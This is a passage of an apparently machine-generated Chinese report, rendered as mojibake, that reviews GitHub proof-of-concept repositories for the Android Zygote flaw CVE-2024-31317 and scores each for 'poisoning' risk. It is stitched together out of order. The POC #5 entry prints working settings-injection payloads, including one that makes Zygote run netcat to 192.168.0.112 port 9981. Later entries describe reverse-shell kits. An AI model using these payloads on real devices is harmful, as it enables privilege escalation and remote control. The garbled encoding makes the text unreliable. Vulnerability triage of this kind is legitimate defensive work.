ç»¼åˆæ¥çœ‹ï¼Œè¯¥POCè„šæœ¬å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†é£é™©è¾ƒä½ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„å®‰å…¨æ€§ä»¥åŠè„šæœ¬æœ¬èº«å¯èƒ½è¢«æ»¥ç”¨ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [Webldix/CVE-2024-31317-PoC-Deployer](https://github.com/Webldix/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #4

**æ¥æº**: [CVE-2024-31317-agg23_cve-2024-31317.md](../2024/CVE-2024-31317-agg23_cve-2024-31317.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android ç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºçš„èº«ä»½ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´è¢«è®¤ä¸ºæ˜¯ Android ç”¨æˆ·æ€ä¸­æœ€æœ‰ä»·å€¼çš„æ¼æ´ä¹‹ä¸€ã€‚å¤šä¸ªæ¥æºï¼ˆå¦‚Metaå®‰å…¨åšå®¢ã€dawnslabã€flanker017åšå®¢ï¼‰éƒ½æä¾›äº†æ¼æ´åˆ†æå’Œåˆ©ç”¨æ–¹æ³•ï¼Œè¡¨æ˜è¯¥æ¼æ´çš„PoCæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ PoC ä»£ç ä¸»è¦åŒ…å«æ¼æ´çš„è§£é‡Šã€Zygote å‚æ•°è¯´æ˜ä»¥åŠæ¨¡æ‹Ÿå™¨è®¾ç½®æŒ‡å—ï¼Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä½†è€ƒè™‘åˆ°ä»£ç ä¸­å¯èƒ½å­˜åœ¨éšè—çš„åé—¨æˆ–æœªå…¬å¼€çš„åˆ©ç”¨æ–¹å¼ï¼Œä¾‹å¦‚å¯¹ç³»ç»Ÿå±æ€§çš„æ¶æ„ä¿®æ”¹ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚é£é™©è¯„ä¼°ä¸º10%ï¼Œé£é™©è¾ƒä½ä½†ä¸å¯å¿½è§†ã€‚ä¸»è¦é£é™©ç‚¹åœ¨äºåˆ©ç”¨`system`æƒé™æ‰§è¡ŒæœªçŸ¥çš„æ“ä½œï¼Œå¯èƒ½å­˜åœ¨éšè”½çš„æ¶æ„è¡Œä¸ºã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ©ç”¨å…·æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨ç¨‹åºã€‚
2.  é€šè¿‡æ„é€ ç‰¹å®šçš„ Zygote å¯åŠ¨å‚æ•°ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ã€‚
3.  ä½¿ Zygote è¿›ç¨‹ä»¥ç›®æ ‡åº”ç”¨ç¨‹åºçš„ UID å’Œ SELinux ä¸Šä¸‹æ–‡å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚
4.  åœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè·å¾—ç›®æ ‡åº”ç”¨ç¨‹åºçš„æƒé™ã€‚æ¯”å¦‚åˆ©ç”¨`shell`æƒé™å¯ä»¥æ‰§è¡Œadb shellå‘½ä»¤ï¼Œåˆ©ç”¨`system`æƒé™å¯ä»¥ä¿®æ”¹ç³»ç»Ÿå±æ€§ã€‚

æ€»è€Œè¨€ä¹‹ï¼Œæ¼æ´åˆ©ç”¨ä¾èµ–äºå¯¹ Zygote å¯åŠ¨å‚æ•°çš„ç²¾ç¡®æ„é€ ä»¥åŠç›®æ ‡ Android ç‰ˆæœ¬çš„ç‰¹æ€§ã€‚

**é¡¹ç›®åœ°å€:** [agg23/cve-2024-31317](https://github.com/agg23/cve-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #5

**æ¥æº**: [CVE-2024-31317-fuhei_CVE-2024-31317.md](../2024/CVE-2024-31317-fuhei_CVE-2024-31317.md)

## CVE-2024-31317 - Android Zygote Deserialization/Command Injection

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡ (Elevation of Privilege)

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®ç°æœ¬åœ°æƒé™æå‡ï¼Œä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ `WRITE_SECURE_SETTINGS` æƒé™ã€‚é€šå¸¸å¯é€šè¿‡ ADB æˆ–å…¶ä»–æ¼æ´è·å–ã€‚ä½ç‰ˆæœ¬Androidå¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ³¨å…¥ï¼Œé«˜ç‰ˆæœ¬éœ€è¦Bypassæ–¹æ¡ˆã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 å…è®¸æ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æˆ–å‘½ä»¤æ³¨å…¥ï¼Œåœ¨ Zygote è¿›ç¨‹ä¸­ä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç ã€‚è¯¥æ¼æ´å­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™è®¾ç½®æ¶æ„çš„ `hidden_api_blacklist_exemptions` å€¼ï¼Œä»è€Œæ³¨å…¥æ¶æ„å‚æ•°ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– `WRITE_SECURE_SETTINGS` æƒé™ï¼š** è¿™æ˜¯åˆ©ç”¨è¯¥æ¼æ´çš„å‰ææ¡ä»¶ã€‚å¯ä»¥é€šè¿‡ ADB (å¦‚æœè®¾å¤‡å·²å¯ç”¨ USB è°ƒè¯•) æˆ–åˆ©ç”¨å…¶ä»–æ¼æ´æ¥è·å–æ­¤æƒé™ã€‚
2.  **æ„é€ æ¶æ„ `hidden_api_blacklist_exemptions` å€¼ï¼š** æ”»å‡»è€…éœ€è¦æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ `settings put global hidden_api_blacklist_exemptions` å‘½ä»¤å°†å…¶å†™å…¥ç³»ç»Ÿè®¾ç½®ã€‚
3.  **è§¦å‘ Zygote è¿›ç¨‹ï¼š**  å†™å…¥è®¾ç½®åï¼Œå½“ç³»ç»Ÿå°è¯•ä½¿ç”¨è¢«ç¯¡æ”¹çš„ `hidden_api_blacklist_exemptions` æ—¶ï¼ŒZygote è¿›ç¨‹ä¼šæ‰§è¡Œæ³¨å…¥çš„æ¶æ„å‘½ä»¤ã€‚

**ä½ç‰ˆæœ¬ (Android 11 åŠä»¥ä¸‹) åˆ©ç”¨ï¼š**
å¯ä»¥ç›´æ¥é€šè¿‡æ¢è¡Œç¬¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n8\n--runtime-args\n--setuid=1000\n--setgid=1000\n--nice-name=com.android.settings\n--app-data-dir=/data/user/0/com.android.settings\n--package-name=com.android.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\nandroid.app.ActivityThread"
```
å¯ä»¥ä½¿ç”¨`invoke-with`å‚æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä½†éœ€è¦å¼€å¯ debug æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡`runtime-flags`å‚æ•°è®¾ç½®æ‰€æœ‰debugå±æ€§ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n7\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=43267\n--invoke-with\nnc 192.168.0.112 9981;\n--seinfo=platform:system_app:targetSdkVersion=29:complete"
```

**é«˜ç‰ˆæœ¬ (Android 12 åŠä»¥ä¸Š) åˆ©ç”¨ï¼š**
ç”±äº Google åœ¨ Android 12 ä¸­å¼•å…¥äº† C++ å‘½ä»¤è§£æå™¨ï¼Œç®€å•çš„å‘½ä»¤æ³¨å…¥ä¸å†æœ‰æ•ˆã€‚éœ€è¦ä½¿ç”¨æ›´å¤æ‚çš„ç»•è¿‡æ–¹æ³•ï¼Œä¾‹å¦‚ï¼Œåœ¨æ³¨å…¥çš„æ¶æ„å‘½ä»¤ä¹‹å‰å¡«å……å¤§é‡é€—å·ä»¥å¢åŠ æ—¶é—´é—´éš”ï¼Œä»è€Œç»•è¿‡ `NativeCommandBuffer` çš„é™åˆ¶ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’Œåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ PoC ä»£ç åº”è¯¥æ˜¯æœ‰æ•ˆçš„ã€‚å¤šä¸ªæœç´¢å¼•æ“ç»“æœéƒ½æåˆ°äº†è¯¥æ¼æ´çš„åˆ©ç”¨ï¼Œå¹¶æä¾›äº†ç›¸å…³çš„åˆ†æå’Œå‚è€ƒé“¾æ¥ã€‚æä¾›çš„åˆ©ç”¨ä»£ç ä¹ŸåŒ…å«äº†ä½ç‰ˆæœ¬å’Œé«˜ç‰ˆæœ¬çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¹¶ç»™å‡ºäº†è¯¦ç»†çš„æ­¥éª¤å’Œç¤ºä¾‹ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è¯¥ä»“åº“ä¸»è¦åŒ…å«æ¼æ´åˆ©ç”¨çš„è¯´æ˜æ–‡æ¡£å’Œä¸€äº›æ„å»ºæ–‡ä»¶ã€‚è™½ç„¶æ— æ³•å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½æ€§ï¼Œä½†ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œé£é™©è¾ƒä½ã€‚é£é™©ç‚¹å¯èƒ½å­˜åœ¨äºåˆ©ç”¨è„šæœ¬ä¸­ï¼Œä¾‹å¦‚æ‰§è¡Œ nc å‘½ä»¤ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç»œå·¥å…·ï¼Œä½†æ˜¯å­˜åœ¨è¢«åˆ©ç”¨çš„é£é™©ï¼Œä¾‹å¦‚è¿æ¥åˆ°æ¶æ„çš„æœåŠ¡å™¨ã€‚gradleæ–‡ä»¶é£é™©è¾ƒå°ï¼Œä¸»è¦æ˜¯æ„å»ºé…ç½®ï¼Œä½†ç†è®ºä¸Šå­˜åœ¨è¿œç¨‹ä¾èµ–å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [fuhei/CVE-2024-31317](https://github.com/fuhei/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #6

**æ¥æº**: [CVE-2024-31317-jmywh1_CVE-2024-31317.md](../2024/CVE-2024-31317-jmywh1_CVE-2024-31317.md)

## CVE-2024-31317-Android-Zygoteååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`android.permission.WRITE_SECURE_SETTINGS`æƒé™ï¼Œç”¨æˆ·äº¤äº’ä¸æ˜¯å¿…é¡»çš„

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317æ˜¯ä¸€ä¸ªAndroidç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äºZygoteProcess.javaçš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰`WRITE_SECURE_SETTINGS`æƒé™çš„åº”ç”¨ç¨‹åºï¼Œä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ï¼Œå¯¼è‡´æœ¬åœ°ææƒã€‚æ ¹æ®NVDçš„æè¿°ï¼Œè¯¥æ¼æ´çš„CVSS 3.1è¯„åˆ†ä¸º7.8ï¼Œå±äºé«˜å±æ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…åˆ©ç”¨`WRITE_SECURE_SETTINGS`æƒé™ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œä¼ é€’ç»™Zygoteè¿›ç¨‹å¤„ç†ã€‚Zygoteè¿›ç¨‹åœ¨ååºåˆ—åŒ–è¿™äº›æ•°æ®æ—¶ï¼Œç”±äºç¼ºä¹è¶³å¤Ÿçš„å®‰å…¨æ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæå‡æƒé™åˆ°å…¶ä»–åº”ç”¨ã€‚

**POCä»£ç åˆ†æï¼š**
æä¾›çš„POCä»£ç åŒ…å«`build.gradle`ã€`gradle.properties`å’Œ`gradlew`æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„Android Gradleé¡¹ç›®çš„åŸºæœ¬æ–‡ä»¶ã€‚å®ƒä»¬ä¸»è¦ç”¨äºæ„å»ºAndroidåº”ç”¨ç¨‹åºï¼Œæœ¬èº«ä¸åŒ…å«ç›´æ¥åˆ©ç”¨CVE-2024-31317æ¼æ´çš„ä»£ç ã€‚è¿™ä¸ªåº“æœ¬èº«åªæ˜¯å®‰å“é¡¹ç›®gradleæ„å»ºæ–‡ä»¶ï¼Œè¦åˆ©ç”¨æ¼æ´è¿˜éœ€è¦æ›´å¤šä¿¡æ¯ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è™½ç„¶æä¾›çš„ä»£ç ç‰‡æ®µæœ¬èº«ä¸ç›´æ¥æ„æˆæ¼æ´åˆ©ç”¨ï¼Œä½†ä½œä¸ºä¸€ä¸ªAndroidé¡¹ç›®ï¼Œå®ƒå¯ä»¥è¢«ç”¨æ¥æ„å»ºåŒ…å«æ¼æ´åˆ©ç”¨ä»£ç çš„æ¶æ„åº”ç”¨ã€‚`gradlew`è„šæœ¬å¯èƒ½è¢«ä¿®æ”¹ä¸ºåŒ…å«ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„ä»£ç çš„æ­¥éª¤ï¼Œæˆ–è€…`build.gradle`æ–‡ä»¶å¯èƒ½è¢«ä¿®æ”¹ä¸ºå¼•å…¥åŒ…å«æ¶æ„ä»£ç çš„ä¾èµ–é¡¹ã€‚è€ƒè™‘åˆ°è¿™ç§å¯èƒ½æ€§ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º10%ã€‚è¿™ä¸ªæ¦‚ç‡ä¸»è¦æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨æ„å»ºè¿‡ç¨‹ä¸­æ·»åŠ æ¶æ„ä¾èµ–æˆ–è€…æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œå¹¶æ²¡æœ‰ç›´æ¥çš„è¯æ®è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [jmywh1/CVE-2024-31317](https://github.com/jmywh1/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #7

**æ¥æº**: [CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317 Android ZygoteProcess ååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´å¯¼è‡´ææƒ

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°ææƒåˆ°ä»»æ„åº”ç”¨æƒé™

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦Useræ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’ï¼Œéœ€è¦WRITE_SECURE_SETTINGSæƒé™ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 70%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android æ“ä½œç³»ç»Ÿä¸­çš„æƒé™æå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™æ‰§è¡Œä»»æ„åº”ç”¨ç¨‹åºçš„ä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´æœ¬åœ°æƒé™æå‡ã€‚ä»æœç´¢å¼•æ“ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´è¢«è®¤ä¸ºæ˜¯è¿‘å¹´æ¥æœ€æœ‰ä»·å€¼çš„Androidç”¨æˆ·ç©ºé—´æ¼æ´ä¹‹ä¸€ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„åˆ©ç”¨æ–¹æ³•ã€‚æ¼æ´åˆ©ç”¨ä»£ç  `Android_Zygote_Research_Kit.sh` è„šæœ¬æ—¨åœ¨å¸®åŠ©ç ”ç©¶äººå‘˜å¤ç°å’Œåˆ†ææ­¤æ¼æ´ã€‚å®ƒåŒ…å«ä¸€ä¸ªåå‘ shell ç¨‹åºï¼ˆ`reverse_shell.c`ï¼‰ï¼Œä¸€ä¸ª payload æ–‡ä»¶ï¼ˆ`payload.txt`ï¼‰ï¼Œä¸€ä¸ªç¼–è¯‘è„šæœ¬ï¼ˆ`compile.sh`ï¼‰ï¼Œä»¥åŠç›¸å…³çš„è¯´æ˜æ–‡æ¡£ã€‚è„šæœ¬å°è¯•åˆ›å»ºä¸€ä¸ªç›‘å¬ç‰¹å®šç«¯å£çš„åå‘ shellï¼Œè¿™æœ¬èº«å°±å­˜åœ¨ä¸€å®šçš„é£é™©ã€‚è„šæœ¬ä¸­åå‘è¿æ¥çš„ç¡¬ç¼–ç ç«¯å£å’ŒIPåœ°å€ï¼Œæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è®¾å¤‡çš„åå‘è¿æ¥ã€‚è€ƒè™‘åˆ°è„šæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç ”ç©¶äººå‘˜ä½¿ç”¨ï¼Œå­˜åœ¨ä¸€ç§æŠ•æ¯’é£é™©ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹åå‘ shell çš„ä»£ç ï¼Œåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ¤å…¥æ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä¿®æ”¹ `reverse_shell.c` ä½¿å…¶åœ¨å»ºç«‹è¿æ¥åæ‰§è¡ŒæŸäº›æ¶æ„æ“ä½œï¼Œæˆ–è€…å°†æ”¶é›†åˆ°çš„ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚ç”±äºè¿™ä¸ªæ¼æ´å…è®¸æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ï¼Œå¦‚æœè¢«æ¶æ„åˆ©ç”¨ï¼Œå¯ä»¥é€ æˆå¾ˆå¤§çš„å±å®³ã€‚

åˆ©ç”¨æ–¹å¼ï¼š

1.  **æƒé™è·å–:** æ”»å‡»è€…éœ€è¦å…ˆè·å¾— `WRITE_SECURE_SETTINGS` æƒé™ã€‚
2.  **æ„é€ æ¶æ„æ•°æ®:**  æ„é€ åŒ…å«æ¶æ„ä»£ç çš„ååºåˆ—åŒ–æ•°æ®ã€‚
3.  **åˆ©ç”¨ ZygoteProcess:**  å°†æ¶æ„æ•°æ®ä¼ é€’ç»™å­˜åœ¨æ¼æ´çš„ `ZygoteProcess.java` å‡½æ•°ã€‚
4.  **ä»£ç æ‰§è¡Œ:**  åˆ©ç”¨ Zygote è¿›ç¨‹çš„æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œå®ç°æƒé™æå‡ã€‚

è¯¥`Android_Zygote_Research_Kit.sh`è„šæœ¬åªæ˜¯ä¸€ä¸ªè¾…åŠ©åˆ©ç”¨å·¥å…·ï¼Œç”¨äºç”Ÿæˆæ‰€éœ€çš„æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [mianliupindao/CVE-2024-31317-PoC-Deployer](https://github.com/mianliupindao/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---



---

## POC #2

**æ¥æº**: [CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰§è¡Œæƒé™(User execution privileges needed)ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ¼æ´å­˜åœ¨äºAndroidç³»ç»Ÿçš„Zygoteè¿›ç¨‹ä¸­ï¼Œç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯¼è‡´å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™å®ç°ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å½±å“Android 12ã€12Lã€13å’Œ14ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æå‡æƒé™ï¼Œåœ¨å—å½±å“çš„è®¾å¤‡ä¸Šä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š**  `ZygoteProcess.java`ä¸­çš„å¤šä¸ªå‡½æ•°å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **æƒé™æå‡ï¼š** æ”»å‡»è€…éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™ï¼Œè¿™ä¸ªæƒé™é€šå¸¸éœ€è¦é€šè¿‡å…¶ä»–æ¼æ´æˆ–è€…é€šè¿‡æ¬ºéª—ç”¨æˆ·æˆäºˆã€‚å¦‚æœæ”»å‡»è€…æ‹¥æœ‰äº†è¿™ä¸ªæƒé™,ä»–ä»¬å°±å¯ä»¥é€šè¿‡Zygoteè¿›ç¨‹æ‰§è¡Œä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•appçš„èº«ä»½ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  é€šè¿‡åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**POCæœ‰æ•ˆæ€§åˆ†æï¼š**

æä¾›çš„`Android_Zygote_Research_Kit.sh`è„šæœ¬åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š

*   `reverse_shell.c`ï¼šä¸€ä¸ªåå‘shellç¨‹åºï¼Œç”¨äºåœ¨ç›®æ ‡è®¾å¤‡ä¸Šå»ºç«‹ä¸æ”»å‡»è€…çš„è¿æ¥ã€‚
*   `payload91011.txt` å’Œ `payload1213.txt`ï¼šé’ˆå¯¹ä¸åŒAndroidç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨payloadã€‚
*   `compile.sh`ï¼šç”¨äºç¼–è¯‘åå‘shellç¨‹åºçš„è„šæœ¬ã€‚
*   `README.txt` å’Œ `CVE-2024-31317.txt`ï¼šæä¾›æ¼æ´åˆ©ç”¨çš„è¯´æ˜å’ŒæŠ€æœ¯åˆ†æã€‚

è¯¥è„šæœ¬é€šè¿‡ç”Ÿæˆæ¶æ„payloadå¹¶ç»“åˆåå‘shellç¨‹åºï¼Œå®ç°äº†å¯¹CVE-2024-31317æ¼æ´çš„åˆ©ç”¨ã€‚å› æ­¤ï¼Œæä¾›çš„POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯å’Œåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶è„šæœ¬ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼æ´ç ”ç©¶å’Œåˆ©ç”¨ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼š

*   **åå‘Shellçš„æ½œåœ¨é£é™©ï¼š** `reverse_shell.c`æœ¬èº«å¯ä»¥è¢«è§†ä¸ºä¸€ç§åé—¨ã€‚ä¸€æ—¦æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—è®¾å¤‡çš„æ§åˆ¶æƒï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚
*   **å…¶ä»–æ¶æ„ä»£ç æ¤å…¥é£é™©ï¼š** è„šæœ¬ä¸­å¯èƒ½åŒ…å«å…¶ä»–æœªå£°æ˜çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ä¿¡æ¯æ”¶é›†ã€æ¶æ„è½¯ä»¶ä¼ æ’­ç­‰ã€‚

